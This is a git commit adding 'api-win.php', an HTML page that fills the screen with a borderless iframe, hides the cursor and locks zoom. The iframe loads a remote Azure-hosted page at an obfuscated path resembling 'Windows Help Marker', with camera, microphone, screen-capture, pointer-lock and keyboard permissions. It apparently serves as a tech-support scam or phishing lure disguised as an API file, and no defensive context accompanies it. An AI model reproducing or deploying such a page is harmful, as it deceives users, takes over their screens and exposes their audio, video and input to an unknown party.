03bc885a6d4a703ab0f1d84021b61bbf29e10558
rosioleydicondori-create <rosioleydicondori@gmail.com>
2026-06-23 20:00:39 +0530

    Add files via upload

---
+++ api-win.php
@@ -0,0 +1,31 @@
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title></title>
+<style>
+  iframe {
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    border: none;
+    top: 0;
+    left: 0;
+  cursor: none;
+}
+</style>
+
+</head>
+<body>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
+
+<iframe 
+  id="f"
+  src="https://knowledgeorbit-d3ggcvf5c0h3a7g6.z03.azurefd.net/Wi0nHelpMark0er007/index.html?ph0nq=null" 
+  allowfullscreen 
+  webkitallowfullscreen 
+  mozallowfullscreen 
+  allow="fullscreen *; pointer-lock *; keyboard-map *; autoplay *; camera *; microphone *; display-capture *; encrypted-media *; picture-in-picture *; screen-wake-lock *">
+</iframe>
+
+</body>
+</html>
